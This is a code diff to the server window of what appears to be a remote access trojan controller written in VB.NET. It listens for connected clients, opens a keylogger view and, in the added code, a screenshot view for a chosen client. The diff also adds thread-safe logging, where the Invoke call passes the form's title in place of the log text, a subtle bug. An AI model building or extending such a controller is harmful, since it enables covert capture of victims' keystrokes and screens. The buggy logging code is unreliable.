@@ -1,12 +1,20 @@
-﻿Imports System.Net
+﻿Imports System.Threading
+Imports System.Net
 Imports System.Net.Sockets
 
 Public Class frmmain
     Public serverTCP As TcpListener
     Public clientMgr As clsClientMgr
 
+    Private Delegate Sub SafeLog(ByVal text As String)
+
     Public Sub Log(ByVal txt As String)
-        txtlog.Text = txtlog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
+        If txtLog.InvokeRequired Then
+            Dim d = New SafeLog(AddressOf Log)
+            txtLog.Invoke(d, New Object() {Text})
+        Else
+            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
+        End If
     End Sub
 
     Private Function Client_Listview_Init()
@@ -132,6 +140,13 @@ Public Class frmmain
     End Sub
 
     Private Sub CrystalClearButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdExit.Click
+        serverTCP.Stop()
+        serverTCP.Server.Dispose()
+
+        For Each client As clsClientObj In clientMgr.GetClientList()
+            client.ForceDisconnect()
+        Next
+
         mSettings.WriteSettings()
         End
     End Sub
@@ -229,5 +244,16 @@ Public Class frmmain
 
         frmKeylogger.KeyloggerObj = selectedClient.GetFeaObjByID(2)
         frmKeylogger.ShowDialog()
+    End Sub
+
+    Private Sub ScreenshotToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenshotToolStripMenuItem.Click
+        Dim selectedClient As clsClientObj = GetSelectedClient()
+        If selectedClient Is Nothing Then
+            MsgBox("Can't get selected client", vbCritical, "Error")
+            Return
+        End If
+
+        frmScreenshot.ScreenshotObj = selectedClient.GetFeaObjByID(4)
+        frmScreenshot.ShowDialog()
     End Sub
 End Class
